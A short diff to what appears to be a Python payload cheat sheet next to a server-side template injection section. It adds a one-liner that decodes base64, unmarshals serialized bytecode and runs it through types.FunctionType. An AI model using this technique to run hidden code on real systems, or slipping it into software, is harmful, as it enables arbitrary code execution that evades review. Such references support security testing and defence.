@@ -64,6 +64,10 @@ def get_img_size(filepath=""):
         return img.size
     return (0, 0)
 ```
+- types.FunctionType
+```python
+(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), ''))()
+```
 
 ### SSTI (jinja2, Mako, Tornado, Django)
 - Template
